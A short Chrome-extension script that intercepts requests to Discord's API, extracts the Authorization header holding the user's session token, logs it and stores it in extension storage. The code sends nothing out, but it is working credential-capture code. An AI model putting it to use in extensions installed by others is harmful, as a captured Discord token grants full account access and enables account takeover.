chrome.webRequest.onBeforeSendHeaders.addListener(
	function (details) {
		if (details.url.match(/discord.com\/api\//)) {
			const token = details.requestHeaders.find(header => header.name.toLowerCase() == "authorization");
			if (token) {
				console.log("トークン発見: " + token.value);
				chrome.storage.local.set({token: token.value}, function () {});
				return;
			}
		}
	},
	{urls: ['https://discord.com/*']},["requestHeaders"]
);